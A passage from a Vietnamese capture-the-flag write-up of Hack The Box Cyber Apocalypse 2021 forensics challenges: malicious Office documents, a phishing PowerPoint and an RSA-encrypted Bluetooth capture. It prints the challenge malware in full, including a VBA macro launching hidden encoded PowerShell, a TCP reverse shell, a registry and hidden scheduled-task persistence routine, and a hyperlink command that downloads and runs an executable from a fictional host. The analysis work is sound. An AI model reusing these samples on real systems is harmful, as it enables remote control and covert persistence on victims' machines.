lAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKABHAGUAdAAt'b'AEkAdABlAG0AUAByAG8AcABlAHIAdAB5AC'b'AASAB
LAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAJAAoACQAcgBlAGcAcAApACkALgAkACgAJAByAGUAZwBuACkAKQApACkA'b'OwAiADsACgAgACAAIAAgAC
QAdAAgAD0AIABOAGUAdwAtAFMAYwBoA'b'GUAZAB1AGwAZQBkAFQAYQBzAGsAVAByAGkAZwBnAGUAcgAgAC0AQQB0AEwAbwBnAE8AbgAgAC0AVQBz'b'AG
UAcgAgACIAJAAoACQAdQApACIAOwA'b'KACAAIAAgACAAJABwACAAPQAgAE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBQAHIAaQBuAGMAa
QBwAGEAbAAgACIA'b'JAAoACQAdQApACIAOwAKACAAIAAgACAAJABzACAAPQAgAE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBTAGUAdAB0
A'b'GkAbgBnAHMAUwBlAHQAIAAtAEgAaQBk'b'AGQAZQBuADsA'b'CgAgACAAIAAgACQAZAAgAD0AIABOAGUAdwAtAFMAYwBoAGUAZAB1AGwAZQBkAFQAY
QBzAGsAIAAtAEEAYwB0AGkAbwBuACAAJABhACAALQBUAHIAaQBnAGcA'b'ZQByACAAJAB0ACAALQBQAHIAaQBuAGMAaQBwAGEAbAAgACQAcAAgAC0AUwBl
AHQAdABpAG4AZwBzACAAJABzADsACgAgACAAIAAgAFIAZQBnAGkAcwB0AGUAcgAtAFM'b'AYwBo'b'AGUAZAB1AGwAZQBkAFQAYQBzAGsAIAAiACQAKAAk
AHIAZQBnAHAAKQAkACgAJAByAGUAZ'b'wBuACkAIgAgAC0ASQBuAHAAdQB0AE8AYgBqAGUAYwB0ACAAJABkADsACgB9AAoA'b'CgAKAGkAZQB4ACAAKAB'
b'bAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAFMAeQBz'b'
AHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEI'b'AYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABwAGEAeQBsAG8AYQBkAEIAYQBzAGU
ANgA0ACkAKQApADsACgAKAA=='"
x = Shell(odsuozldxufm("50b'OWERSHELL.ex'b'e -noexit -w hidd'b'en -enc '") & bomazpcuwhstlcd & dbcsmjrdsqm & gxiwcxqzq
i & uejdkidq, 1)
End Function


...skipping 1 line
Private Function odsuozldxufm(ByVal gwndcowqyulk As String) As String
Dim cjzkqjwvtdxr As Long
For cjzkqjwvtdxr = 1 To Len(gwndcowqyulk) Step 2
odsuozldxufm = odsuozldxufm & Chr$(Val("&H" & Mid$(gwndcowqyulk, cjzkqjwvtdxr, 2)))
Next cjzkqjwvtdxr
End Function
.....
.....
```
* Chúng ta có thể thấy chúng được encode bằng base64. Decode ta được

```
. ( $PshomE[4]+$pshoMe[30]+'x') ( [strinG]::join('' , ([REGeX]::MaTCHES( ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(" ,'.' ,'R'+'iGHTtOl'+'eft' ) | FoREaCH-OBJecT {$_.VALUE} ))  )


$payloadBase64 = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADYALgAyADMAMwAzAC4ANQA0AC4AMgAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==";

//$payloadBase64 = "$client = New-Object System.Net.Sockets.TCPClient("196.2333.54.2",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"


SEt ("G8"+"h")  (  " ) )63]Rahc[,'raZ'EcalPeR-  43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}atem_we'+'n_eht'+'_2N1 = n'+'gerr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . "  ) ;-jOIn ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue[ - 1.. - ( ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue.LengtH)] | IeX 

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
';
[Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0);


if ($payloadBase64 -match "http:|https:") {
    $payloadBase64 = (New-Object "Net.Webclient").DownloadString($payloadBase64);
}

$installed = Get-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -ea SilentlyContinue;


if ($installed) {


    if ($installed -ne $payloadBase64) {
        Set-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -Force -Value $payloadBase64;
    }

# installation
} else {
    

    if ($FALSE -eq (Test-Path -Path "HKCU:\Software\$($regp)\")) {
        New-Item -Path "HKCU:\Software\$($regp)";
    }
    Set-ItemProperty -Path "HKCU:\Software\$($regp)" -Name "$($regn)" -Force -Value $payloadBase64;
    
    
    $u = [Environment]::UserName;
    
    
    $task = Get-ScheduledTask -TaskName "$($regp)$($regn)" -ea SilentlyContinue;
    if ($task) {
        Unregister-ScheduledTask -TaskName "$($regp)$($regn)" -Confirm:$false;
    }
    
    
    $a = New-ScheduledTaskAction -Execute "powershell.exe" "-w hidden -ExecutionPolicy Bypass -nop -NoExit -C Write-host 'Windows update ready'; iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software\$($regp)).$($regn))));";
    $t = New-ScheduledTaskTrigger -AtLogOn -User "$($u)";
    $p = New-ScheduledTaskPrincipal "$($u)";
    $s = New-ScheduledTaskSettingsSet -Hidden;
    $d = New-ScheduledTask -Action $a -Trigger $t -Principal $p -Settings $s;
    Register-ScheduledTask "$($regp)$($regn)" -InputObject $d;
}


iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payloadBase64)));
```

* Ok. Phân tích nào. Chúng ta có thể thấy chúng là đoạn lệnh powershell được mã hóa.

```
. ( $PshomE[4]+$pshoMe[30]+'x') ( [strinG]::join('' , ([REGeX]::MaTCHES( ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(" ,'.' ,'R'+'iGHTtOl'+'eft' ) | FoREaCH-OBJecT {$_.VALUE} ))  )
```
* Nhìn đoạn lệnh này chúng ta có thể nhìn ra `CHTB{`
* Chạy thử trên Powershell
* Và `( $PshomE[4]+$pshoMe[30]+'x')` là một đoạn ngắn của Invoke-Expression 

![image](https://user-images.githubusercontent.com/62060867/116120354-a58cf000-a6e9-11eb-9eb2-899890e519fa.png)

* Loại bỏ `( $PshomE[4]+$pshoMe[30]+'x')` 

![image](https://user-images.githubusercontent.com/62060867/116120809-2946dc80-a6ea-11eb-9015-6ba4355234eb.png)

```
('iqwreg'+'p ='+' jXtCH'+'T'+'B{'+'maldocs_arej'+'Xt;').REPLACe('iqw','$').REPLACe('jXt',[sTRInG][chAR]34) |&( $sheLLiD[1]+$sHeLlID[13]+'x')
```

* Chúng ta có tiếp một obfuscated IEX khác `( $sheLLiD[1]+$sHeLlID[13]+'x')`
* Loại bỏ nó ta có được một nửa flag 

![image](https://user-images.githubusercontent.com/62060867/116121307-ae31f600-a6ea-11eb-9db6-28310a468b61.png)

* Tiếp tục với
```
SEt ("G8"+"h")  (  " ) )63]Rahc[,'raZ'EcalPeR-  43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}atem_we'+'n_eht'+'_2N1 = n'+'gerr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . "  ) ;-jOIn ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue[ - 1.. - ( ( lS ("VAR"+"IaB"+"LE:g"+"8H")  ).VALue.LengtH)] | IeX 

```
![image](https://user-images.githubusercontent.com/62060867/116122516-159c7580-a6ec-11eb-8a00-2a27789a68d5.png)

> # So we got the flag: CHTB{maldocs_are_the_new_meta}

# 4.AlienPhish


[forensics_alienphish.zip](https://github.com/Stirring16/CTF-Hack-The-Box-Cyber-Apocalypse-2021/files/6378938/forensics_alienphish.zip)

![image](https://user-images.githubusercontent.com/62060867/116123714-8c863e00-a6ed-11eb-9d0a-0fe1b3ea40d1.png)

* Tiếp tục với Phân tích tài liệu độc, lần này là một file PowerPoint

![image](https://user-images.githubusercontent.com/62060867/116124382-6c0ab380-a6ee-11eb-8401-b0c692f3119f.png)

* Như ta đã là, unzip file `pptx`
```
┌──(kali㉿kali)-[~/Desktop/HTB/AlienPhise]
└─$ unzip Alien\ Weaknesses.pptx 
Archive:  Alien Weaknesses.pptx
  inflating: [Content_Types].xml     
  inflating: _rels/.rels             
  inflating: ppt/slides/_rels/slide1.xml.rels  
  inflating: ppt/_rels/presentation.xml.rels  
  inflating: ppt/presentation.xml    
  inflating: ppt/slides/slide1.xml   
  inflating: ppt/slideLayouts/_rels/slideLayout5.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout8.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout10.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout11.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout9.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout6.xml.rels  
  inflating: ppt/slideMasters/_rels/slideMaster1.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout1.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout2.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout3.xml.rels  
  inflating: ppt/slideLayouts/_rels/slideLayout7.xml.rels  
  inflating: ppt/slideLayouts/slideLayout11.xml  
  inflating: ppt/slideLayouts/slideLayout10.xml  
  inflating: ppt/slideLayouts/slideLayout3.xml  
  inflating: ppt/slideLayouts/slideLayout2.xml  
  inflating: ppt/slideLayouts/slideLayout1.xml  
  inflating: ppt/slideMasters/slideMaster1.xml  
  inflating: ppt/slideLayouts/slideLayout4.xml  
  inflating: ppt/slideLayouts/slideLayout5.xml  
  inflating: ppt/slideLayouts/slideLayout6.xml  
  inflating: ppt/slideLayouts/slideLayout7.xml  
  inflating: ppt/slideLayouts/slideLayout8.xml  
  inflating: ppt/slideLayouts/slideLayout9.xml  
  inflating: ppt/slideLayouts/_rels/slideLayout4.xml.rels  
  inflating: ppt/theme/theme1.xml    
 extracting: ppt/media/image1.png    
 extracting: ppt/media/image2.png    
 extracting: docProps/thumbnail.jpeg  
  inflating: ppt/presProps.xml       
  inflating: ppt/tableStyles.xml     
  inflating: ppt/viewProps.xml       
  inflating: docProps/app.xml        
  inflating: docProps/core.xml       
                                
```
* Sau khi mình check tất cả các file thì nhận thấy file `slide1_xml.rels` chứa một chuỗi đáng ngờ

```
┌──(kali㉿kali)-[~/…/AlienPhise/ppt/slides/_rels]
└─$ strings slide1.xml.rels 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1.png"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22" TargetMode="External"/><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout1.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image2.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="cmd.exe" TargetMode="External"/></Relationships>

```

* Nhìn vào các Target ta sẽ thấy ngay đoạn bất thường

```
Target="cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;&amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;&amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22"
```

* Nếu để ý thì sẽ thấy một số string bị đảo ngược

```
neila -> alien
htraeyortsed -> destroyearth
ptth -> http
```
* Reverse đoạn Target này lại

```

22%52%=!XCk*:XCk52%02%llac02%002%qel02%X52%02%fi;pma&;pma&!1,X52%~:My!!XCk!=XCk02%tes02%od)0;1-;221(02%ni02%X52%02%L/02%rof;pma&;pma&powershell02%-c02%22%$o02%=02%$env:temp02%+02%'Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99.exe';02%iwr02%http:/destroyearth.alien/x.exe02%-outfile02%$o22%=My02%tes22%C/NO:V/02%exe.dmc"=tegraT
```

* Ta có một đoạn trông như base64 `Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM`

```
>>> import base64
>>> flag = "Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM="
>>> base64.b64decode(flag)
b'CHTB{pH1sHiNg_w0_m4cr0s'

```
> # So we got the flag: CHTB{pH1sHiNg_w0_m4cr0s}

# 5.Low Energy Crypto	

[forensics_low_energy_crypto.zip](https://github.com/Stirring16/CTF-Hack-The-Box-Cyber-Apocalypse-2021/files/6379183/forensics_low_energy_crypto.zip)

![image](https://user-images.githubusercontent.com/62060867/116129688-965f6f80-a6f4-11eb-8794-622ad1df2033.png)

* Tiếp tục với file `PCAPNG`. Lần đầu tiên gặp Protocol LE LL nên mình đã tìm tất cả các thông tin quan trọng. 
* Đầu tiên mình phát hiện được 2 phần Key Public ở Packet 215 và 223

![image](https://user-images.githubusercontent.com/62060867/116129688-965f6f80-a6f4-11eb-8794-622ad1df2033.png)

![image](https://user-images.githubusercontent.com/62060867/116130774-cfe4aa80-a6f5-11eb-93a1-d396f463906b.png)

```
-----BEGIN PUBLIC KEY-----
MGowDQYJKoZIhvcNAQEBBQADWQAwVgJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0m
B9fjj4tlGekPOW+f8JGzgYJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/3Li
4l+RI2g0FqJvf3ff
-----END PUBLIC KEY-----
```

* Yep, tiếp tục ở Packet 230 mình tìm thấy được đoạn strings

![image](https://user-images.githubusercontent.com/62060867/116130934-fd315880-a6f5-11eb-98d3-b2c0b21c2002.png)

* Copy text strings 

![image](https://user-images.githubusercontent.com/62060867/116334667-cd6e7780-a7ff-11eb-8881-733281d047f6.png)

```
┌──(kali㉿kali)-[~/Desktop/CTF/HTB/LowEnergyCrypto]
└─$ cat ciphertext    
9)i�▒�����^E����x�9��w��bm�@�9*����"�B���c��������pw��8                                                                                            

```


* Bài này dùng thuật toán RSA để mã hóa 
* Ok, vậy chúng ta có `public key` và `ciphertext` rồi, mình đi tìm `privatekey`

```
┌──(kali㉿kali)-[~/Desktop/CTF/HTB/LowEnergyCrypto]
└─$ openssl rsa -in ./publickey -text -inform PEM -pubin
RSA Public-Key: (512 bit)
Modulus:
    00:a2:8f:1f:19:e6:91:65:42:e1:f8:de:ec:a3:1b:
    59:97:f4:ef:34:75:d0:3d:26:07:d7:e3:8f:8b:65:
    1a:43:ce:5b:e7:fc:24:6c:e0:60:94:56:6e:87:a4:
    72:76:5f:89:0a:cb:46:10:37:44:49:f5:95:42:a4:
    44:09:d4:a8:09
Exponent:
    00:cb:ff:72:e2:e2:5f:91:23:68:34:16:a2:6f:7f:
    77:df
writing RSA key
-----BEGIN PUBLIC KEY-----
MGowDQYJKoZIhvcNAQEBBQADWQAwVgJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0m
B9fjj4tlGkPOW+f8JGzgYJRWboekcnZfiQrLRhA3REn1lUKkRAnUqAkCEQDL/3Li
4l+RI2g0FqJvf3ff
-----END PUBLIC KEY-----

```

* Tiếp theo có Modulus và Exponent rồi, lấy private key thôi

```
p = 92270847179792937622745249326651258492889546364106258880217519938223418249279

q = 92270847179792937622745249326651258492889546364106258880217519938223418258871

e = 271159649013582993327688821275872950239
```

* Mình dùng [rsatool](https://github.com/ius/rsatool/blob/master/rsatool.py) để lấy private key

```
──(kali㉿kali)-[~/Desktop/CTF/HTB/LowEnergyCrypto]
└─$ python3 rsatool.py -p 92270847179792937622745249326651258492889546364106258880217519938223418249279 -q 92270847179792937622745249326651258492889546364106258880217519938223418258871 -e 271159649013582993327688821275872950239 -o private 
Using (p, q) to initialise RSA instance

n =
a28f1f19e6916542e1f8deeca31b5997f4ef3475d03d2607d7e38f8b651a43ce5be7fc246ce06094
566e87a472765f890acb4610374449f59542a44409d4a809

e = 271159649013582993327688821275872950239 (0xcbff72e2e25f9123683416a26f7f77df)

d =
587f5ba09f76fa1f56ddb4bcbe27a2c280f1fe2b51347253eba6b8cf8c53b5a4f524c5a7f1b3c3b2
b0c0dd4f9541c7b7594522f1edc09f4d55914ca4a3c1828f

p =
cbff72e2e25f9123683416a26f7f77cb7199bbe424b9f138dc0dc130b3c2103f

q =
cbff72e2e25f9123683416a26f7f77cb7199bbe424b9f138dc0dc130b3c235b7

Saving PEM as private
                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/CTF/HTB/LowEnergyCrypto]
└─$ cat private                            
-----BEGIN RSA PRIVATE KEY-----
MIIBRwIBAAJBAKKPHxnmkWVC4fje7KMbWZf07zR10D0mB9fjj4tlGkPOW+f8JGzgYJRWboekcnZf
iQrLRhA3REn1lUKkRAnUqAkCEQDL/3Li4l+RI2g0FqJvf3ffAkBYf1ugn3b6H1bdtLy+J6LCgPH+
K1E0clPrprjPjFO1pPUkxafxs8OysMDdT5VBx7dZRSLx7cCfTVWRTKSjwYKPAiEAy/9y4uJfkSNo
NBaib393y3GZu+QkufE43A3BMLPCED8CIQDL/3Li4l+RI2g0FqJvf3fLcZm75CS58TjcDcEws8I1
twIgJXpkF+inPgZETjVKdec6UGg75ZwW3WTPEoVANux3DscCIDjx+RSYECVaraeGG2O/v8iKe6dn
1GpMVGUuaKecISArAiA0QRYkZFB5D4BnOxGkMX3ihjn7NFPQ7+Jk/abWRRq6+w==
-----END RSA PRIVATE KEY-----

```
* Có Private key rồi :D dùng Openssl tiếp để có flag thôi

```
                                                                                                                         
┌──(kali㉿kali)-[~/Desktop/CTF/HTB/LowEnergyCrypto]
└─$ openssl rsautl -decrypt -raw -inkey private -in ciphertext 
�5����p+wɹ�[R�.;���^�bs� �6yCHTB{5p34k_fr13nd_4nd_3n73r}
```
(Bài này kết thúc giải rồi mình mới ra do hơi gà về crypyo hehe)
> # So we got the flag: CHTB{5p34k_fr13nd_4nd_3n73r}






